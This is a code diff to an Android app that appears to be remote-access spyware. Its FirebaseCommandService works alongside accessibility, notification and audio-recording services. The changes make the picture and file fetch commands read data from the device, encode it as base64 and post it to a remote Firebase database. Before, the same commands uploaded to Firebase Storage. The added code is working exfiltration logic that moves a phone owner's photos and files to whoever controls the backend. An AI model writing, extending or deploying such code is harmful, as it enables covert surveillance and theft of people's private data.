@@ -35,7 +35,11 @@ import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
-import com.google.firebase.storage.FirebaseStorage
+import android.util.Base64
+import android.graphics.BitmapFactory
+import android.graphics.Bitmap
+import java.io.ByteArrayOutputStream
+
 import com.jonas.x24.AudioRecordManager
 import com.jonas.x24.services.x24AccessibilityService
 import com.jonas.x24.services.x24NotificationService
@@ -189,20 +193,28 @@ class FirebaseCommandService : Service() {
                 return
             }
 
-            val storageRef = FirebaseStorage.getInstance().reference
-            val currentSession = sessionKey ?: return
-            val storagePath = "sessions/$currentSession/files/${System.currentTimeMillis()}_${file.name}"
-            val fileRef = storageRef.child(storagePath)
+            val options = BitmapFactory.Options()
+            options.inJustDecodeBounds = true
+            BitmapFactory.decodeFile(file.absolutePath, options)
 
-            fileRef.putFile(android.net.Uri.fromFile(file)).addOnSuccessListener {
-                fileRef.downloadUrl.addOnSuccessListener { uri ->
-                    // We send the URL and the storage path, separated by a pipe
-                    postResult("IMAGE", "${uri.toString()}|$storagePath")
-                }.addOnFailureListener {
-                    postResult("ERROR", "Failed to get download URL for picture.")
-                }
-            }.addOnFailureListener {
-                postResult("ERROR", "Failed to upload picture to storage: ${it.message}")
+            var scale = 1
+            while (options.outWidth / scale / 2 >= 1024 && options.outHeight / scale / 2 >= 1024) {
+                scale *= 2
+            }
+
+            val decodeOptions = BitmapFactory.Options()
+            decodeOptions.inSampleSize = scale
+            val bitmap = BitmapFactory.decodeFile(file.absolutePath, decodeOptions)
+
+            if (bitmap != null) {
+                val baos = ByteArrayOutputStream()
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
+                val imageBytes = baos.toByteArray()
+                val base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
+                postResult("IMAGE", base64Image)
+                bitmap.recycle()
+            } else {
+                postResult("ERROR", "Failed to decode image file.")
             }
         } catch (e: Exception) {
             postResult("ERROR", "Failed to fetch picture: ${e.message}")
@@ -217,20 +229,15 @@ class FirebaseCommandService : Service() {
                 return
             }
 
-            val storageRef = FirebaseStorage.getInstance().reference
-            val currentSession = sessionKey ?: return
-            val storagePath = "sessions/$currentSession/files/${System.currentTimeMillis()}_${file.name}"
-            val fileRef = storageRef.child(storagePath)
-
-            fileRef.putFile(android.net.Uri.fromFile(file)).addOnSuccessListener {
-                fileRef.downloadUrl.addOnSuccessListener { uri ->
-                    postResult("FILE", "${file.name}|${uri.toString()}|$storagePath")
-                }.addOnFailureListener {
-                    postResult("ERROR", "Failed to get download URL for file.")
-                }
-            }.addOnFailureListener {
-                postResult("ERROR", "Failed to upload file to storage: ${it.message}")
+            if (file.length() > 2 * 1024 * 1024) { // 2MB limit
+                postResult("ERROR", "File is too large to fetch directly (limit 2MB). Size: ${file.length() / (1024 * 1024)} MB")
+                return
             }
+
+            val bytes = file.readBytes()
+            val base64File = Base64.encodeToString(bytes, Base64.NO_WRAP)
+            postResult("FILE", "${file.name}|$base64File")
+
         } catch (e: Exception) {
             postResult("ERROR", "Failed to fetch file: ${e.message}")
         }
